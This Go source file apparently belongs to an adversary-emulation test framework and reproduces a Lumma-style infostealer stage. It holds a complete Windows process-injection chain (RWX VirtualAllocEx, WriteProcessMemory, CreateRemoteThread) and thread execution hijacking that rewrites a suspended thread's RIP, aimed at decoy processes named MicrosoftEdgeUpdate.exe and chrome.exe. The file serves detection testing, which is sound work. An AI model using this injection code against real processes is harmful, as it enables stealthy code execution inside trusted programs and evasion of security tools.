// Stage 2 — T1055.003 Process Injection: EdgeUpdate → chrome remote-thread
// injection + thread execution hijacking (test-owned decoy processes)
// F0RT1KA Security Testing Framework — Lumma-style infostealer emulation
//
// Recent Lumma builds (NCC Group; Gen Digital "Remus") perform remote-thread
// injection from a process named MicrosoftEdgeUpdate.exe into chrome.exe to
// run collection under a trusted, browser-adjacent process. This stage
// reproduces the exact Win32 API chain against TEST-OWNED decoys:
//
//   • The stage binary copies ITSELF to
//       c:\Users\fortika-test\lumma_inj\MicrosoftEdgeUpdate.exe   (injector)
//       c:\Users\fortika-test\lumma_inj\chrome.exe                (idle host)
//     so process telemetry shows the real adversary process names while the
//     code remains F0RT1KA's own (approved safety decision 2026-11-02: never
//     touch a real browser process).
//
//   • MicrosoftEdgeUpdate.exe performs the classic chain:
//       OpenProcess → VirtualAllocEx(RWX) → WriteProcessMemory(shellcode)
//       → CreateRemoteThread                     [remote-thread injection]
//     then the literal Thread Execution Hijacking sequence on the host's main
//     thread:
//       OpenThread → SuspendThread → GetThreadContext → SetThreadContext(RIP
//       = injected stub) → ResumeThread          [T1055.003 core]
//
//   • Injected stubs are auditable marker shellcodes (see shellcode_windows.go)
//     that resolve kernel32!CreateFileA via PEB walk and create marker files
//     inside the decoy chrome.exe — proving code execution in the "browser".
//
// HOST/INJECTOR protocol (files under lumma_inj\):
//   host.info   "pid mainTid"     written by chrome.exe host on start
//   result.json injector output  {"rt_marker":bool,"hj_marker":bool,...}
//   host_term   created by the injector's own TerminateProcess cleanup
//
// EXIT CODES (parent mode): 0 = both injections verified; 126 = positive
// prevention evidence (OS-emitted denial on OUR decoy objects, or the idle
// decoy host terminated by an external actor mid-protocol); 999 = error.

//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	TEST_UUID      = "26a8b54e-b51c-489d-beae-295e1eecc524"
	TECHNIQUE_ID   = "T1055.003"
	TECHNIQUE_NAME = "Process Injection: EdgeUpdate → chrome Remote Thread + Thread Execution Hijacking (T1055.003)"
	STAGE_ID       = 2
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

const (
	injDirName   = "lumma_inj"
	hostInfoFile = "host.info"
	resultFile   = "result.json"
	termFlagFile = "host_term"
	rtMarkerFile = "marker_rt.txt"
	hjMarkerFile = "marker_hj.txt"
	hostTimeout  = 150 * time.Second
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	mode := "parent"
	if len(os.Args) > 1 {
		switch os.Args[1] {
		case "-lumma-host":
			mode = "host"
		case "-lumma-injector":
			mode = "injector"
		}
	}

	var exit int
	switch mode {
	case "host":
		exit = hostMain()
	case "injector":
		exit = injectorMain()
	default:
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
		LogStageStart(STAGE_ID, TECHNIQUE_ID, TECHNIQUE_NAME)
		exit = parentMain()
	}

	switch exit {
	case StageSuccess:
		fmt.Printf("[STAGE %s] Injection chain completed - code ran inside decoy chrome.exe\n", TECHNIQUE_ID)
		LogMessage("SUCCESS", TECHNIQUE_ID, "Remote-thread injection and thread hijack both verified via markers")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Injection verified under browser-named decoy processes")
	case StageBlocked:
		fmt.Printf("[STAGE %s] Injection prevented (positive evidence)\n", TECHNIQUE_ID)
		LogMessage("BLOCKED", TECHNIQUE_ID, "Injection chain stopped with positive prevention evidence")
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, "Injection prevented (positive evidence)")
	default:
		fmt.Printf("[STAGE %s] Stage error - inconclusive\n", TECHNIQUE_ID)
		LogMessage("ERROR", TECHNIQUE_ID, "Injection stage inconclusive or prerequisite failure")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", "Stage error or inconclusive")
	}
	os.Exit(exit)
}

// ============================================================================
// Parent mode — stages the decoys and supervises the protocol.
// ============================================================================

func parentMain() int {
	injDir := filepath.Join(ARTIFACT_DIR, injDirName)
	if err := os.MkdirAll(injDir, 0755); err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("failed to create %s: %v", injDir, err))
		return StageError
	}
	// Tier-1 cleanup: the whole decoy area (decoy PEs, protocol files, markers,
	// and any staged download residue from Stage 1) is removed on every exit
	// path. Registered first so it runs after the protocol teardown below.
	defer func() {
		if err := os.RemoveAll(injDir); err != nil {
			LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("cleanup: lumma_inj removal incomplete: %v", err))
		} else {
			LogMessage("INFO", TECHNIQUE_ID, "cleanup: decoy injection area removed")
		}
	}()

	// Clean slate for markers/protocol files.
	for _, f := range []string{hostInfoFile, resultFile, termFlagFile, rtMarkerFile, hjMarkerFile} {
		_ = os.Remove(filepath.Join(injDir, f))
	}

	selfExe, err := os.Executable()
	if err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("failed to resolve own executable: %v", err))
		return StageError
	}
	selfBytes, err := os.ReadFile(selfExe)
	if err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("failed to read own image for decoy copy: %v", err))
		return StageError
	}

	edgeUpdatePath := filepath.Join(injDir, "MicrosoftEdgeUpdate.exe")
	chromePath := filepath.Join(injDir, "chrome.exe")
	for _, dst := range []string{edgeUpdatePath, chromePath} {
		if err := os.WriteFile(dst, selfBytes, 0755); err != nil {
			LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("failed to stage decoy %s: %v", dst, err))
			return StageError
		}
		LogFileDropped(filepath.Base(dst), dst, int64(len(selfBytes)), false)
	}

	// chrome.exe decoy host (idle, protocol-ready).
	hostCmd := exec.Command(chromePath, "-lumma-host")
	if err := hostCmd.Start(); err != nil {
		code, why := classifyLaunchParent(err, chromePath)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("decoy chrome.exe launch outcome: %s", why))
		if code == StageBlocked {
			return StageBlocked
		}
		return StageError
	}
	fmt.Printf("[STAGE %s] decoy chrome.exe host started (pid %d)\n", TECHNIQUE_ID, hostCmd.Process.Pid)

	// Wait for host.info (host readiness).
	hostInfoPath := filepath.Join(injDir, hostInfoFile)
	if !waitFile(hostInfoPath, 20*time.Second) {
		LogMessage("ERROR", TECHNIQUE_ID, "decoy chrome.exe did not publish host.info in time")
		terminateSilently(hostCmd)
		return StageError
	}

	// MicrosoftEdgeUpdate.exe injector — the observable adversary pattern.
	injCmd := exec.Command(edgeUpdatePath, "-lumma-injector")
	var injOut strings.Builder
	injCmd.Stdout = &injOut
	injCmd.Stderr = &injOut
	injErr := injCmd.Run()
	fmt.Print(injOut.String())
	if injErr != nil {
		if _, isExit := injErr.(*exec.ExitError); !isExit {
			// Injector decoy never launched — numeric-errno classification.
			code, why := classifyLaunchParent(injErr, edgeUpdatePath)
			LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("MicrosoftEdgeUpdate.exe launch outcome: %s", why))
			if code == StageBlocked {
				return StageBlocked
			}
		} else {
			LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("MicrosoftEdgeUpdate.exe injector returned: %v", injErr))
		}
	}

	// Did the idle decoy host die from an external actor mid-protocol?
	// Positive-evidence rule: the host is our own process, idle by design.
	// The injector records whether IT performed the TerminateProcess cleanup;
	// a host death not attributable to the injector (or to this parent's own
	// grace-window cleanup) is an external kill.
	parentKilledHost := false
	if res, jerr := readInjectorResult(injDir); jerr == nil && !res.WeTerminatedHost {
		if hostCmd.ProcessState == nil {
			// Host still alive; give it a moment to exit on its own, then
			// check whether it died unexpectedly while the injector was gone.
			done := make(chan struct{})
			go func() { _ = hostCmd.Wait(); close(done) }()
			select {
			case <-done:
			case <-time.After(5 * time.Second):
				parentKilledHost = true
				terminateSilently(hostCmd)
				<-done
			}
		}
		if !parentKilledHost && hostCmd.ProcessState != nil && !hostCmd.ProcessState.Success() {
			LogMessage("CRITICAL", TECHNIQUE_ID, "idle decoy chrome.exe terminated by external actor mid-protocol (positive prevention evidence)")
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, "Decoy chrome.exe host killed externally during injection protocol")
			return StageBlocked
		}
	}
	if hostCmd.ProcessState == nil {
		_ = hostCmd.Wait()
	}

	// Collect the injector's structured verdict.
	res, rerr := readInjectorResult(injDir)
	if rerr != nil {
		LogMessage("ERROR", TECHNIQUE_ID, "injector did not write result.json - inconclusive")
		return StageError
	}
	if res.Blocked {
		return StageBlocked
	}
	if !res.RTMarker || !res.HJMarker {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("markers incomplete (rt=%v hj=%v) without positive denial evidence", res.RTMarker, res.HJMarker))
		return StageError
	}
	LogMessage("CRITICAL", TECHNIQUE_ID, fmt.Sprintf("injection verified: remote-thread marker + hijack marker both created inside decoy chrome.exe (pid %d)", res.HostPID))
	return StageSuccess
}

// classifyLaunchParent maps a decoy-launch failure to block/error (Rule 8).
// The quarantine stat check uses the REAL decoy path we just wrote.
func classifyLaunchParent(err error, decoyPath string) (int, string) {
	return classifyStageLaunchError(err, decoyPath)
}

type injectorResult struct {
	RTMarker         bool   `json:"rt_marker"`
	HJMarker         bool   `json:"hj_marker"`
	Blocked          bool   `json:"blocked"`
	WeTerminatedHost bool   `json:"we_terminated_host"`
	Reason           string `json:"reason,omitempty"`
	HostPID          int    `json:"host_pid"`
}

func flagExists(dir, name string) bool {
	_, err := os.Stat(filepath.Join(dir, name))
	return err == nil
}

// readInjectorResult loads the injector's structured verdict from result.json.
func readInjectorResult(dir string) (injectorResult, error) {
	var res injectorResult
	raw, err := os.ReadFile(filepath.Join(dir, resultFile))
	if err != nil {
		return res, err
	}
	if jerr := json.Unmarshal(raw, &res); jerr != nil {
		return res, jerr
	}
	return res, nil
}

func waitFile(path string, timeout time.Duration) bool {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if _, err := os.Stat(path); err == nil {
			return true
		}
		time.Sleep(200 * time.Millisecond)
	}
	return false
}

func terminateSilently(cmd *exec.Cmd) {
	if cmd.Process != nil {
		_ = cmd.Process.Kill()
		_ = cmd.Wait()
	}
}

// ============================================================================
// Host mode — decoy chrome.exe: publish pid/main-tid, idle until flagged.
// ============================================================================

func hostMain() int {
	injDir := filepath.Join(ARTIFACT_DIR, injDirName)
	tid := currentThreadID()
	pid := os.Getpid()
	if err := os.WriteFile(filepath.Join(injDir, hostInfoFile),
		[]byte(fmt.Sprintf("%d %d", pid, tid)), 0644); err != nil {
		return StageError
	}
	// Idle as a realistic browser-host would; exit when the injector flags
	// cleanup, when a marker proves the hijack ran, or on hard timeout.
	deadline := time.Now().Add(hostTimeout)
	for time.Now().Before(deadline) {
		if flagExists(injDir, termFlagFile) {
			return 0
		}
		time.Sleep(200 * time.Millisecond)
	}
	return 0
}

func currentThreadID() uint32 {
	rv, _, _ := procGetCurrentThreadId.Call()
	return uint32(rv)
}

// ============================================================================
// Injector mode — decoy MicrosoftEdgeUpdate.exe: the real API chain.
// ============================================================================

var (
	kernel32               = syscall.NewLazyDLL("kernel32.dll")
	procOpenProcess        = kernel32.NewProc("OpenProcess")
	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	procOpenThread         = kernel32.NewProc("OpenThread")
	procSuspendThread      = kernel32.NewProc("SuspendThread")
	procResumeThread       = kernel32.NewProc("ResumeThread")
	procGetThreadContext   = kernel32.NewProc("GetThreadContext")
	procSetThreadContext   = kernel32.NewProc("SetThreadContext")
	procTerminateProcess   = kernel32.NewProc("TerminateProcess")
	procGetCurrentThreadId = kernel32.NewProc("GetCurrentThreadId")
)

const (
	processCreateThread     = 0x0002
	processQueryInformation = 0x0400
	processVMOperation      = 0x0008
	processVMRead           = 0x0010
	processVMWrite          = 0x0020
	processTerminate        = 0x0001

	threadQueryInformation = 0x0040
	threadGetContext       = 0x0008
	threadSetContext       = 0x0010
	threadSuspendResume    = 0x0002

	memCommit            = 0x1000
	memReserve           = 0x2000
	pageExecuteReadwrite = 0x40

	contextAmd64   = 0x00100000
	contextControl = contextAmd64 | 0x00000001
	contextInteger = contextAmd64 | 0x00000002
	contextFull    = contextControl | contextInteger

	waitInfiniteOr10S = 10000 // ms for remote thread
)

// x64 CONTEXT — only the fields needed to read/rewrite RIP. The struct must
// be large enough for GetThreadContext (x64 CONTEXT is 1232 bytes; the fixed
// fields below occupy the first 256).
type x64Context struct {
	P1Home, P2Home, P3Home, P4Home, P5Home, P6Home uint64 // 48
	ContextFlags, MxCsr                            uint32 // 8
	SegCs, SegDs, SegEs, SegFs, SegGs, SegSs       uint16 // 12
	EFlags                                         uint32 // 4
	Dr0, Dr1, Dr2, Dr3, Dr6, Dr7                   uint64 // 48
	Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi         uint64 // 64
	R8, R9, R10, R11, R12, R13, R14, R15           uint64 // 64
	Rip                                            uint64 // 8 → 256
	_                                              [1232 - 256]byte
}

func injectorMain() int {
	injDir := filepath.Join(ARTIFACT_DIR, injDirName)
	writeResult := func(res injectorResult) {
		raw, _ := json.Marshal(res)
		_ = os.WriteFile(filepath.Join(injDir, resultFile), raw, 0644)
	}
	res := injectorResult{}
	defer func() {
		// Flag cleanup BEFORE terminating the host so the parent can
		// distinguish our TerminateProcess from an external kill.
		_ = os.WriteFile(filepath.Join(injDir, termFlagFile), []byte("term"), 0644)
		if res.HostPID != 0 {
			if h, _, _ := procOpenProcess.Call(processTerminate, 0, uintptr(res.HostPID)); h != 0 {
				rv, _, _ := procTerminateProcess.Call(h, 0)
				if rv != 0 {
					res.WeTerminatedHost = true
				}
				syscall.CloseHandle(syscall.Handle(h))
			}
		}
		writeResult(res)
	}()

	// ---- Read host protocol info ----
	raw, err := os.ReadFile(filepath.Join(injDir, hostInfoFile))
	if err != nil {
		res.Reason = "host.info missing"
		return StageError
	}
	var hostPID, hostTID int
	if _, perr := fmt.Sscanf(strings.TrimSpace(string(raw)), "%d %d", &hostPID, &hostTID); perr != nil {
		res.Reason = "host.info unparsable"
		return StageError
	}
	res.HostPID = hostPID

	// ---- OpenProcess on the decoy browser process ----
	access := processCreateThread | processQueryInformation | processVMOperation | processVMRead | processVMWrite
	hProc, _, err := procOpenProcess.Call(uintptr(access), 0, uintptr(hostPID))
	if hProc == 0 {
		errno, ok := err.(syscall.Errno)
		if ok && errno == 5 { // ERROR_ACCESS_DENIED on OUR OWN decoy process
			res.Blocked = true
			res.Reason = "OpenProcess on decoy chrome.exe returned ERROR_ACCESS_DENIED"
			fmt.Printf("[INJECTOR] OpenProcess decoy chrome.exe returned ERROR_ACCESS_DENIED (positive evidence)\n")
			return StageBlocked
		}
		res.Reason = fmt.Sprintf("OpenProcess failed with OS error %d", uintptr(errnoOrZero(err)))
		return StageError
	}
	defer syscall.CloseHandle(syscall.Handle(hProc))
	fmt.Printf("[INJECTOR] OpenProcess(chrome.exe pid=%d) ok\n", hostPID)

	// ---- Phase 1: remote-thread injection (VirtualAllocEx → Write → CreateRemoteThread) ----
	cave1, okAlloc := remoteWrite(hProc, scRemoteThread)
	if !okAlloc {
		res.Reason = "VirtualAllocEx/WriteProcessMemory failed"
		return StageError
	}
	fmt.Printf("[INJECTOR] shellcode written at 0x%x; CreateRemoteThread...\n", cave1)

	hThread, _, err := procCreateRemoteThread.Call(0, 0, 0, cave1, 0, 0, 0)
	if hThread == 0 {
		errno, ok := err.(syscall.Errno)
		if ok && errno == 5 {
			res.Blocked = true
			res.Reason = "CreateRemoteThread returned ERROR_ACCESS_DENIED"
			return StageBlocked
		}
		res.Reason = fmt.Sprintf("CreateRemoteThread failed with OS error %d", uintptr(errnoOrZero(err)))
		return StageError
	}
	syscall.WaitForSingleObject(syscall.Handle(hThread), waitInfiniteOr10S)
	syscall.CloseHandle(syscall.Handle(hThread))

	rtPath := filepath.Join(injDir, rtMarkerFile)
	res.RTMarker = waitFile(rtPath, 10*time.Second)
	fmt.Printf("[INJECTOR] remote-thread marker present: %v\n", res.RTMarker)
	if !res.RTMarker {
		res.Reason = "remote thread completed but marker absent (inconclusive)"
		return StageError
	}

	// ---- Phase 2: Thread Execution Hijacking (the literal T1055.003) ----
	hThreadMain, _, err := procOpenThread.Call(
		uintptr(threadQueryInformation|threadGetContext|threadSetContext|threadSuspendResume), 0, uintptr(hostTID))
	if hThreadMain == 0 {
		errno, ok := err.(syscall.Errno)
		if ok && errno == 5 {
			res.Blocked = true
			res.Reason = "OpenThread returned ERROR_ACCESS_DENIED"
			return StageBlocked
		}
		res.Reason = fmt.Sprintf("OpenThread failed with OS error %d", uintptr(errnoOrZero(err)))
		return StageError
	}
	defer syscall.CloseHandle(syscall.Handle(hThreadMain))

	if rv, _, _ := procSuspendThread.Call(hThreadMain); rv == 0xFFFFFFFF {
		res.Reason = "SuspendThread returned (DWORD)-1"
		return StageError
	}
	fmt.Printf("[INJECTOR] host main thread suspended - hijacking RIP\n")

	ctx := x64Context{ContextFlags: contextFull}
	if rv, _, cerr := procGetThreadContext.Call(hThreadMain, uintptr(unsafe.Pointer(&ctx))); rv == 0 {
		res.Reason = fmt.Sprintf("GetThreadContext failed: %v", cerr)
		procResumeThread.Call(hThreadMain)
		return StageError
	}
	origRIP := ctx.Rip

	cave2, okAlloc2 := remoteWrite(hProc, scThreadHijack)
	if !okAlloc2 {
		procResumeThread.Call(hThreadMain)
		res.Reason = "second VirtualAllocEx/WriteProcessMemory failed"
		return StageError
	}
	ctx.Rip = uint64(cave2)
	if rv, _, serr := procSetThreadContext.Call(hThreadMain, uintptr(unsafe.Pointer(&ctx))); rv == 0 {
		res.Reason = fmt.Sprintf("SetThreadContext failed: %v", serr)
		procResumeThread.Call(hThreadMain)
		return StageError
	}
	procResumeThread.Call(hThreadMain)
	fmt.Printf("[INJECTOR] thread resumed at hijack stub 0x%x (orig RIP 0x%x)\n", cave2, origRIP)

	hjPath := filepath.Join(injDir, hjMarkerFile)
	res.HJMarker = waitFile(hjPath, 10*time.Second)
	fmt.Printf("[INJECTOR] hijack marker present: %v\n", res.HJMarker)
	if !res.HJMarker {
		res.Reason = "thread hijacked but marker absent (inconclusive)"
		return StageError
	}

	return StageSuccess
}

// remoteWrite performs VirtualAllocEx(RWX) + WriteProcessMemory in hProc.
func remoteWrite(hProc uintptr, sc []byte) (uintptr, bool) {
	addr, _, err := procVirtualAllocEx.Call(hProc, 0,
		uintptr(len(sc)), uintptr(memCommit|memReserve), uintptr(pageExecuteReadwrite))
	if addr == 0 {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("VirtualAllocEx failed: OS error %d", uintptr(errnoOrZero(err))))
		return 0, false
	}
	var written uintptr
	if rv, _, werr := procWriteProcessMemory.Call(hProc, addr,
		uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), uintptr(unsafe.Pointer(&written))); rv == 0 {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("WriteProcessMemory failed: OS error %d", uintptr(errnoOrZero(werr))))
		return 0, false
	}
	return addr, true
}

func errnoOrZero(err error) uintptr {
	if errno, ok := err.(syscall.Errno); ok {
		return uintptr(errno)
	}
	return 0
}
